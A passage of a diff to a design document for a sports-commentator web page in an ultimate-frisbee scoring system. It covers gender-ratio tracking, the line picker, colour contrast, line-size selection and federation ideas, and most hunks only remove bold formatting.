+An unlinked desk may declare it too — on that screen alone. The ratio is read off the paper scoresheet, and a desk that never links must not lose the ABBA panel and the picker assist over it. The declaration is kept in that browser, labelled "this screen only" wherever it shows, and the shared value stays the authority: the moment one exists it wins, the local one is dropped, and the takeover is said once in the panel rather than silently relabelling the points. Nothing local ever enters the room as a side effect — once the desk is linked, sharing the local value is its own one-click offer, because an unshared guess must not reach the stage just because a code was typed.
 
 ### 6c. Which ratio each side is winning
 
@@ -539,7 +539,7 @@ Once four points have been played the ratio panel adds the split: how each team 
 
 The readout names the two sides once and then gives each ratio its numbers — `Points won · Harbour Herons – Valley Vipers · 4MMP 3–2 · 4FMP 2–2`. `4MMP 3–2` alone made the reader work out which 3 was whose from the panel order, and this is glanced at between points. Naming both teams against *both* ratios reads better still and runs to two rows on a 1280-wide desk, which the panel cannot afford — it is one line by design, and every row it takes is a row the lines lose.
 
-**This game only, and that is a limit rather than an omission.** A pre-game or tournament-wide version would be the more interesting stat and it cannot be built. The first point's ratio is decided per game — the scoresheet prints both options with a box to circle (`cust/wfdf/pdfscoresheet.php:475`) — so "ratio A" in one game and "ratio A" in the next are not necessarily the same ratio. Without the per-game choice recorded somewhere, adding two games' splits together produces a number that looks meaningful and is not.
+This game only, and that is a limit rather than an omission. A pre-game or tournament-wide version would be the more interesting stat and it cannot be built. The first point's ratio is decided per game — the scoresheet prints both options with a box to circle (`cust/wfdf/pdfscoresheet.php:475`) — so "ratio A" in one game and "ratio A" in the next are not necessarily the same ratio. Without the per-game choice recorded somewhere, adding two games' splits together produces a number that looks meaningful and is not.
 
 That makes it another entry on the same list as possession: the pattern is derivable, the labels are not, and the fix is upstream. If UltiOrganizer recorded the first point's ratio alongside the score, every mixed game ever played would become analysable this way at once.
 
@@ -557,17 +557,17 @@ The attention rules are §7's, one notch relaxed: the region is fixed, below the
 
 With matchings (§5a) and this point's ratio (§6b) in hand, the line picker stops making the commentator count. On the roster the matching tints the whole row and is named by a small tag; on the field view it is the tag alone — teal for FMP, violet for MMP, deliberately neither of the stereotyped colours, the term carrying the meaning and the tint only making a list readable in colour blocks.
 
-**"The term carries the meaning" is a requirement, not a flourish.** The two tints are near-identical in luminance — 1.05:1 against each other in daylight — and red-green colour blindness collapses what hue difference remains to nothing (1.01:1 simulated, deuteranopia and protanopia alike). Nothing may therefore depend on telling teal from violet: the tag names the matching wherever it is read, the picker's rows group it structurally, and the chips carry it in their title. The *inks* are the part that has to measure, and they are tested — the FMP tag was drawn in teal-800 on teal-100, which came to 6.73:1 and missed this page's 7:1 bar, and no contrast test covered the matching tints at all until one did. On the picker the tint moves onto the chips themselves — a picker is clicked, not read, so a label under every number was clutter — and **each matching gets a row of its own**, so the grouping is something the eye lands on rather than something it infers from the tints. The majority matching's row is on top: the point needs four of them rather than three, so that is the longer row and the bulk of the clicking. The per-matching count sits in the panel header beside the team name, in the same order as the rows: `Harbour Herons · 3 / 7 · MMP 2 of 4 · FMP 1 of 3`.
+"The term carries the meaning" is a requirement, not a flourish. The two tints are near-identical in luminance — 1.05:1 against each other in daylight — and red-green colour blindness collapses what hue difference remains to nothing (1.01:1 simulated, deuteranopia and protanopia alike). Nothing may therefore depend on telling teal from violet: the tag names the matching wherever it is read, the picker's rows group it structurally, and the chips carry it in their title. The *inks* are the part that has to measure, and they are tested — the FMP tag was drawn in teal-800 on teal-100, which came to 6.73:1 and missed this page's 7:1 bar, and no contrast test covered the matching tints at all until one did. On the picker the tint moves onto the chips themselves — a picker is clicked, not read, so a label under every number was clutter — and **each matching gets a row of its own**, so the grouping is something the eye lands on rather than something it infers from the tints. The majority matching's row is on top: the point needs four of them rather than three, so that is the longer row and the bulk of the clicking. The per-matching count sits in the panel header beside the team name, in the same order as the rows: `Harbour Herons · 3 / 7 · MMP 2 of 4 · FMP 1 of 3`.
 
 A matching whose quota is exactly filled sets its unpicked players aside — every one of them could only make the line illegal — and a **full line sets every unpicked player aside**, unknown-matching included: nothing unpicked can join a full line, so showing it only invites the eighth pick. Unpicking somebody brings the affected chips back; the picked stay visible and keep their matching tint under an accent ring, so the chosen line's gender split stays readable and a swap is one unpick away. Players without matching data always list last and are never hidden: absent is not a matching, and an empty spreadsheet cell must not make somebody disappear from a picker. Setting a filled group aside is a deliberate exception to "show the consequence; never block the click" (`AGENTS.md`): a displaced card is often intended, an eighth FMP never is.
 
-**A team with no matchings at all gets a warning, not zeros.** Counts of "0 of 3" beside a full line read as a broken picker when the truth is a room without the metadata — so when nobody on a mixed roster carries a matching, the counts and grouping stand down and one line says what is missing and where it comes from: the team's sheet, in the room the sync code names.
+A team with no matchings at all gets a warning, not zeros. Counts of "0 of 3" beside a full line read as a broken picker when the truth is a room without the metadata — so when nobody on a mixed roster carries a matching, the counts and grouping stand down and one line says what is missing and where it comes from: the team's sheet, in the room the sync code names.
 
-**The line size is declared, because nothing upstream records it.** `seasoninfo.type` is a *surface* — outdoor, indoor, beach — and no table in UltiOrganizer has a players-per-side column at game, pool, series or season level; the payload confirms it (`seasoninfo`, `game_info` and `poolinfo` all carry caps, timeouts and scores, and no size). So a **Players per side** selector sits in the commentator toolbar and in the Studio's tracking bar, offering 7v7, 6v6, 5v5 and 4v4, and it syncs exactly as the ratio does: shared through the possession store when the desk is linked, kept on the screen when it is not, and a shared value replaces a local one with a one-shot note saying so. The season type's conventional size — outdoor 7, indoor and beach 5 — is the default, and it is a default rather than a fact.
+The line size is declared, because nothing upstream records it. `seasoninfo.type` is a *surface* — outdoor, indoor, beach — and no table in UltiOrganizer has a players-per-side column at game, pool, series or season level; the payload confirms it (`seasoninfo`, `game_info` and `poolinfo` all carry caps, timeouts and scores, and no size). So a **Players per side** selector sits in the commentator toolbar and in the Studio's tracking bar, offering 7v7, 6v6, 5v5 and 4v4, and it syncs exactly as the ratio does: shared through the possession store when the desk is linked, kept on the screen when it is not, and a shared value replaces a local one with a one-shot note saying so. The season type's conventional size — outdoor 7, indoor and beach 5 — is the default, and it is a default rather than a fact.
 
 It is offered in every division, not only mixed: a 6v6 open game is as real as a 6v6 mixed one, and the "x / 7" cap is as wrong in it.
 
-**Changing the size clears a ratio that no longer fits.** A stored `4MMP/3FMP` against a declared six leaves the two disagreeing about how many people are on the field, and every consumer resolves that differently — the quotas from one, the cap from the other. Silence is recoverable; a confident contradiction is not. The store enforces it, so the rule holds whichever surface made the change.
+Changing the size clears a ratio that no longer fits. A stored `4MMP/3FMP` against a declared six leaves the two disagreeing about how many people are on the field, and every consumer resolves that differently — the quotas from one, the cap from the other. Silence is recoverable; a confident contradiction is not. The store enforces it, so the rule holds whichever surface made the change.
 
 ### 6b2. An even line size retires the ratio entirely
 
@@ -577,9 +577,9 @@ So at an even size the whole ratio apparatus stands down, exactly as it does in 
 
 What does *not* stand down is the picker. 3/3 is still a rule a mixed line has to obey, so the quotas, the grouping and the counts carry on working from the forced split, which needs no declaring: one ratio exists and every point is played at it.
 
-**At an odd size the majority half names the ratio** — `4MMP` and `4FMP` at sevens, `3MMP` and `3FMP` at fives. On a fixed line size the majority implies the other half and there is nothing else it could mean, which avoids ever having to decide which category gets printed first. An even split cannot use that convention and prints in full: shortening `3MMP/3FMP` to `3MMP` would say three and two, which is a different line.
+At an odd size the majority half names the ratio — `4MMP` and `4FMP` at sevens, `3MMP` and `3FMP` at fives. On a fixed line size the majority implies the other half and there is nothing else it could mean, which avoids ever having to decide which category gets printed first. An even split cannot use that convention and prints in full: shortening `3MMP/3FMP` to `3MMP` would say three and two, which is a different line.
 
-**The grouping survives the start of the point.** The on-field panel's two rows *are* the two matchings, majority first — the same grouping and the same order as the picker that produced the line. They previously split a number-sorted list down the middle, which produced rows that looked like 4 and 3 and mixed the matchings inside them: the one thing the rows exist to show. Without matchings there is nothing to group by, and even halves are the honest fallback.
+The grouping survives the start of the point. The on-field panel's two rows *are* the two matchings, majority first — the same grouping and the same order as the picker that produced the line. They previously split a number-sorted list down the middle, which produced rows that looked like 4 and 3 and mixed the matchings inside them: the one thing the rows exist to show. Without matchings there is nothing to group by, and even halves are the honest fallback.
 
 The grouping decisions live in `shared/lineup.js`, pure and tested directly; the point's ratio derives from the declared first point plus the ABBA pattern (`shared/ratio.js`), so the ratio panel and the picker cannot disagree about which ratio this point is. Before anyone declares point 1's ratio, the picker is the plain flat list.
 
@@ -618,7 +618,7 @@ This is the feature most worth getting right and the easiest to make actively ha
 - **A queue, not a race.** Two goals in quick succession must not have the second stamp on the first; the second waits or the panel shows both.
 - **Muteable.** A commentator who finds it distracting must be able to turn it off and keep the rest of the page. Assume some will.
 
-**Trigger detection is already solved for goals.** The scoreboard detects a score change and identifies the scorer today (`lastGoalOutcome()` plus the named goal entry) — the same signal drives the HOLD/BREAK flash. A commentator page reuses that mechanism against a slower poll.
+Trigger detection is already solved for goals. The scoreboard detects a score change and identifies the scorer today (`lastGoalOutcome()` plus the named goal entry) — the same signal drives the HOLD/BREAK flash. A commentator page reuses that mechanism against a slower poll.
 
 **Blocks cannot trigger anything yet.** Tournament totals are now reachable (§4), but a trigger needs to know a block *just happened*, and that means the per-game list — which is in no payload (`STUDIO.md` §3.4) and waits on the direct-database decision. Goal-triggered surfacing is the whole of what can ship first.
 
@@ -632,9 +632,9 @@ One caveat worth designing for: **the page will lag the commentator's own eyes.*
 
 **The idea:** UltiOrganizer and Live! instances are islands. Every tournament runs its own database, so a player's record, a club's results and a head-to-head history all end at the edge of whichever installation happened to host the event. If instances could read one another, this page could answer questions it currently cannot answer at all.
 
-**What it unlocks is exactly the category §3 lists and §4 cannot deliver: pre-match notes.** Head-to-head history against tonight's opponent. A player's career rather than their tournament. Which of these players have been team-mates before, and where. The last time these two clubs met and what happened. Those are the lines that separate commentary from score-reading, and every one of them needs data from an event this instance never hosted.
+What it unlocks is exactly the category §3 lists and §4 cannot deliver: pre-match notes. Head-to-head history against tonight's opponent. A player's career rather than their tournament. Which of these players have been team-mates before, and where. The last time these two clubs met and what happened. Those are the lines that separate commentary from score-reading, and every one of them needs data from an event this instance never hosted.
 
-**The abstraction already exists one level down, which is the encouraging part.** UltiOrganizer separates the per-event row from the persistent entity in both directions:
+The abstraction already exists one level down, which is the encouraging part. UltiOrganizer separates the per-event row from the persistent entity in both directions:
 
 | per event | persistent | link |
 |---|---|---|
@@ -643,7 +643,7 @@ One caveat worth designing for: **the page will lag the commentator's own eyes.*
 
 So "the same person across teams and seasons" is already a first-class concept inside one installation. `uo_player_stats` is keyed by `player_id` but carries `profile_id`, `season` and `series` alongside it — a career table in all but name. Federation is that same abstraction one level up: what `profile_id` does across seasons, a global identifier would do across instances.
 
-**And there is precedent for anchoring a profile to a foreign system.** `uo_player_profile.ffindr_id` and `uo_team_profile.ffindr_id` are exactly that — another service's id stored against a local record, on both the person and the club. Worth being accurate about their state: nothing in `lib/`, `admin/` or `user/` writes either column. They appear only in `lib/privacy.functions.php`, which clears them on anonymisation, and `lib/data.functions.php`, which classifies them as private. The *shape* has a precedent; a working integration does not.
+And there is precedent for anchoring a profile to a foreign system. `uo_player_profile.ffindr_id` and `uo_team_profile.ffindr_id` are exactly that — another service's id stored against a local record, on both the person and the club. Worth being accurate about their state: nothing in `lib/`, `admin/` or `user/` writes either column. They appear only in `lib/privacy.functions.php`, which clears them on anonymisation, and `lib/data.functions.php`, which classifies them as private. The *shape* has a precedent; a working integration does not.
 
 ### The hard part is identity, not transport
 
@@ -668,7 +668,7 @@ Erasure runs the same way in reverse. Today, deleting or anonymising a player is
 
 ### Scope
 
-**None of this can happen in this repository.** `PLAN.md` §6 forbids schema changes here, and federation is a UltiOrganizer-wide change to identity, privacy and the API long before it is anything a commentator sees. It is recorded in these documents because the commentator page is where its absence is felt most sharply, not because it is a task on this project's list. `UPSTREAM.md` carries it as an upstream ask.
+None of this can happen in this repository. `PLAN.md` §6 forbids schema changes here, and federation is a UltiOrganizer-wide change to identity, privacy and the API long before it is anything a commentator sees. It is recorded in these documents because the commentator page is where its absence is felt most sharply, not because it is a task on this project's list. `UPSTREAM.md` carries it as an upstream ask.
 
 ## 9. MVP
 
@@ -701,7 +701,7 @@ Explicitly not in the MVP: search, drill-down, milestones, streak detection, bra
 
 **Ordering note:** items 2–4 are a single static page over one payload and are worth building first, because they are useful even if the auto-surfacing (5) is later judged too distracting to keep. Within them, the rosters come before the feed: a commentator can work from rosters alone, but not from a feed alone.
 
-**The pronunciation and pronoun store is a separate, smaller piece**, and can ship before or after the page — an editor over a `conf/` JSON file, with the page showing a hint when one exists and nothing when it does not. Neither field blocks the other, and neither blocks the MVP; both are useful from the first entry.
+The pronunciation and pronoun store is a separate, smaller piece, and can ship before or after the page — an editor over a `conf/` JSON file, with the page showing a hint when one exists and nothing when it does not. Neither field blocks the other, and neither blocks the MVP; both are useful from the first entry.
 
 7. **Prepared talking points** (§5a) — **built.** A free-text note per player in the detail overlay, shared by the room code, with the roster marking who has one. It is listed after the MVP because it was not in the original plan, and ahead of everything deferred because it needed no upstream change and no data the page did not already have.
 
